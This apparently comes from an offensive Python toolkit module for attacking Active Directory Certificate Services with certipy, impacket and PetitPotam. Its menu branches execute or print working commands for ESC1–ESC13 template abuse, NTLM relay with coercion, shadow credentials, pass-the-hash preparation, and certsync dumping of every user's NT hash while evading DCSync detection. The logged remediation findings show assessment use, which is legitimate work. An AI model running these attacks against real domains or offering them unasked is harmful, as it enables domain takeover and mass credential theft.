"""
Module: ADCS Certificate Abuse — ESC1 through ESC8
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("ADCS CERTIFICATE ABUSE", "ESC1–ESC15")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    ca   = prompt("CA Name (blank = auto-detect)")
    auth = f"-u '{user}@{dom}' -p '{pw}'"

    print("""
  [1]  Find Vulnerable Templates    (certipy find)
  [2]  ESC1  - Enroll as Domain Admin (SAN abuse)
  [3]  ESC4  - Overwrite template ACL
  [4]  ESC6  - CA flag abuse (EDITF_ATTRIBUTESUBJECTALTNAME2)
  [5]  ESC8  - NTLM Relay to ADCS HTTP enrollment
  [6]  Shadow Credentials
  [7]  Request TGT from Certificate (PKINIT)
  [8]  UnPAC-the-Hash
  [9]  ESC9  - No security extension (CT_FLAG_NO_SECURITY_EXTENSION)
  [10] ESC10 - Weak certificate mapping
  [11] ESC11 - IF_ENFORCEENCRYPTICERTREQUEST not set (relay to RPC)
  [12] ESC13 - OID Group Link abuse
  [13] CertSync / certsync — DCSync via ADCS
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()
    ca_str = f"-ca '{ca}'" if ca else ""

    if c == "1":
        stop = spinner("Scanning ADCS templates")
        run_cmd(f"certipy find {auth} -dc-ip {dc} -vulnerable -stdout")
        stop()

    elif c == "2":
        template = prompt("Template name (e.g. User)")
        upn      = prompt("Target UPN (e.g. administrator@corp.local)")
        run_cmd(f"certipy req {auth} -dc-ip {dc} -template '{template}' -upn '{upn}' {ca_str}")
        info("Next: certipy auth -pfx <file>.pfx -dc-ip {dc}")
        add_finding("ESC1 Certificate Abuse", "Critical",
                    f"Enrolled cert as {upn}", "Restrict template enrollment; require CA manager approval")

    elif c == "3":
        template = prompt("Template to overwrite")
        run_cmd(f"certipy template {auth} -dc-ip {dc} -template '{template}' -save-old")

    elif c == "4":
        run_cmd(f"certipy ca {auth} -dc-ip {dc} -enable-template 'SubCA'")
        run_cmd(f"certipy req {auth} -dc-ip {dc} -template SubCA -upn 'administrator@{dom}' {ca_str}")

    elif c == "5":
        lhost = prompt("Attacker IP")
        info(f"Run: impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController")
        run_cmd(f"certipy relay -ca {dc} -template DomainController")

    elif c == "6":
        target = prompt("Target account")
        run_cmd(f"certipy shadow auto {auth} -account '{target}' -dc-ip {dc}")

    elif c == "7":
        pfx = prompt(".pfx file path")
        run_cmd(f"certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom}")

    elif c == "8":
        pfx = prompt(".pfx file path")
        run_cmd(f"certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom} -no-hash")

    elif c == "9":
        template = prompt("Vulnerable template name")
        target_upn = prompt("Target UPN (e.g. administrator@corp.local)")
        print(f"""
  {NEON_CYN}ESC9 — CT_FLAG_NO_SECURITY_EXTENSION (no szOID_NTDS_CA_SECURITY_EXT):{RST}

  {DIM}If msPKI-Enrollment-Flag has CT_FLAG_NO_SECURITY_EXTENSION (0x80000),
  the issued cert does NOT bind to the requester's SID → can be used for
  account mapping to a different user (if GenericWrite on a target account).{RST}

  ── Step 1: Enumerate vulnerable templates ────────────────────────────────
  certipy find -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} -vulnerable -stdout | grep -A5 ESC9

  ── Step 2: Change target account UPN (GenericWrite required) ────────────
  certipy account update -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -user '<target_acct>' -upn '{target_upn}'

  ── Step 3: Request certificate as target UPN ─────────────────────────────
  certipy req -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -template '{template}' {ca_str}

  ── Step 4: Restore UPN (clean up) ───────────────────────────────────────
  certipy account update -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -user '<target_acct>' -upn '<original_upn>'

  ── Step 5: Authenticate with cert ───────────────────────────────────────
  certipy auth -pfx administrator.pfx -domain {dom} -dc-ip {dc}
""")
        add_finding("ESC9 Certificate Abuse", "Critical",
                    f"CT_FLAG_NO_SECURITY_EXTENSION on template '{template}' — UPN manipulation → impersonate {target_upn}",
                    "Remove CT_FLAG_NO_SECURITY_EXTENSION from msPKI-Enrollment-Flag; restrict GenericWrite on user objects")

    elif c == "10":
        print(f"""
  {NEON_CYN}ESC10 — Weak Certificate Mapping (StrongCertificateBindingEnforcement=0 or 1):{RST}

  {DIM}When StrongCertificateBindingEnforcement registry key is 0 or 1 (not 2),
  certificate-to-account mapping is weak → UPN in cert used for auth
  → same technique as ESC9 (UPN manipulation) works even on standard templates.{RST}

  ── Check registry on DC ─────────────────────────────────────────────────
  reg query "HKLM\\System\\CurrentControlSet\\Services\\Kdc" \\
    /v StrongCertificateBindingEnforcement
  # 0 = disabled (fully exploitable)
  # 1 = compatibility mode (exploitable)
  # 2 = full enforcement (not exploitable)

  ── Also check on CA ─────────────────────────────────────────────────────
  reg query "HKLM\\System\\CurrentControlSet\\Services\\CertSvc\\Configuration\\<CA>" \\
    /v CertificateMappingMethods
  # Bit 0x4 = UPN mapping (weak) — exploitable
  # Bit 0x8 = SID mapping (strong) — not exploitable alone

  ── Exploit (ESC10a — user template, change UPN): ────────────────────────
  # Requires GenericWrite on target account + any enrollable template
  certipy account update -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -user '<target>' -upn 'administrator@{dom}'
  certipy req -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} -template User {ca_str}
  certipy account update -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -user '<target>' -upn '<original_upn>'
  certipy auth -pfx administrator.pfx -domain {dom} -dc-ip {dc}

  ── Exploit (ESC10b — computer template, change dNSHostName): ────────────
  certipy account update -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -user '<target_computer>' -dns 'DC.{dom}'
  certipy req -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} -template Machine {ca_str}
  certipy auth -pfx dc.pfx -domain {dom} -dc-ip {dc}
""")
        add_finding("ESC10 Weak Certificate Mapping", "Critical",
                    f"StrongCertificateBindingEnforcement < 2 on {dc} — UPN/DNS manipulation → arbitrary account impersonation",
                    "Set StrongCertificateBindingEnforcement=2 on all DCs (KB5014754); update CA CertificateMappingMethods")

    elif c == "11":
        print(f"""
  {NEON_CYN}ESC11 — IF_ENFORCEENCRYPTICERTREQUEST Not Set (NTLM Relay to RPC):{RST}

  {DIM}If EDITF_ATTRIBUTESUBJECTALTNAME2 is NOT set but
  IF_ENFORCEENCRYPTICERTREQUEST is also NOT set, NTLM relay attacks
  work against the ICPR (RPC) interface of the CA — not just HTTP.{RST}

  ── Check CA flag ────────────────────────────────────────────────────────
  certipy find -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} -stdout | grep -i ESC11

  ── Relay to ICPR (RPC) instead of HTTP ──────────────────────────────────
  # Terminal 1:
  certipy relay -target 'rpc://<CA_server>' -template DomainController

  # Terminal 2 — trigger coercion:
  python3 PetitPotam.py -u '{user}' -p '{pw}' -d {dom} <attacker_ip> {dc}

  # Authenticate with obtained cert:
  certipy auth -pfx dc.pfx -domain {dom} -dc-ip {dc}
""")
        add_finding("ESC11 RPC Relay", "Critical",
                    f"IF_ENFORCEENCRYPTICERTREQUEST not set on CA — NTLM relay to ICPR possible → DC certificate",
                    "Set IF_ENFORCEENCRYPTICERTREQUEST on CA; enforce HTTPS with EPA for all enrollment interfaces")

    elif c == "12":
        print(f"""
  {NEON_CYN}ESC13 — OID Group Link Abuse:{RST}

  {DIM}An issuance policy OID linked to a group via msDS-OIDToGroupLink.
  If a template issues a cert with that OID, the cert holder gets
  the linked group's privileges during Kerberos auth → privilege escalation.{RST}

  ── Enumerate OID-to-group links ─────────────────────────────────────────
  # AD Module
  Get-ADObject -Filter {{objectClass -eq "msPKI-Enterprise-Oid"}} \\
    -Properties msDS-OIDToGroupLink,msPKI-Cert-Template-OID |
    select Name,'msDS-OIDToGroupLink',msPKI-Cert-Template-OID

  # certipy
  certipy find -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} -stdout | grep -i ESC13

  ── Exploit ───────────────────────────────────────────────────────────────
  # Request cert from the ESC13-vulnerable template:
  certipy req -u '{user}@{dom}' -p '{pw}' -dc-ip {dc} \\
    -template '<esc13_template>' {ca_str}

  # Authenticate — Kerberos PAC will include the linked group:
  certipy auth -pfx <user>.pfx -domain {dom} -dc-ip {dc}

  # If linked group = Domain Admins → full DA access via cert auth
""")
        add_finding("ESC13 OID Group Link", "High",
                    f"msPKI-Enterprise-Oid linked to privileged group — certificate enrollment grants group membership in PAC",
                    "Audit msDS-OIDToGroupLink attributes; restrict enrollment on OID-linked templates to necessary principals")

    elif c == "13":
        print(f"""
  {NEON_CYN}CertSync / certsync — DCSync via ADCS (no DRSUAPI needed):{RST}

  {DIM}certsync uses ADCS + PKINIT to obtain NT hashes for all domain accounts
  without using the traditional DCSync (DRSUAPI) — bypasses DCSync detection.{RST}

  ── Requirements ──────────────────────────────────────────────────────────
  • Domain Admin or CA Admin access
  • PKINIT enabled
  • CA accessible

  ── Step 1: Dump all certs from CA ────────────────────────────────────────
  certsync -u '{user}' -p '{pw}' -d {dom} -dc-ip {dc} -ns {dc}

  ── Step 2: certsync auto-flow (enumerate + dump NT hashes) ───────────────
  # certsync requests certs for every user via CA → uses PKINIT UnPAC-the-Hash
  # Result: NT hash for every user with a valid certificate
  certsync -u '{user}' -p '{pw}' -d {dom} -dc-ip {dc} --output /tmp/certsync_hashes.txt

  {NEON_CYN}Alternative — manual UnPAC-the-Hash for specific user: ─────────────{RST}
  # Request cert via ESC1/ESC8:
  certipy req -u '{user}@{dom}' -p '{pw}' -template User -upn 'administrator@{dom}' {ca_str}
  # Auth + extract NT hash:
  certipy auth -pfx administrator.pfx -domain {dom} -dc-ip {dc}
  # Hash in output → use for PTH

  {DIM}certsync project: github.com/zblurx/certsync{RST}
""")
        add_finding("CertSync (ADCS DCSync)", "Critical",
                    f"NT hashes extracted for all domain users via ADCS+PKINIT — bypasses traditional DCSync detection",
                    "Restrict CA enrollment permissions; monitor mass certificate issuance; audit PKINIT usage")

    pause()
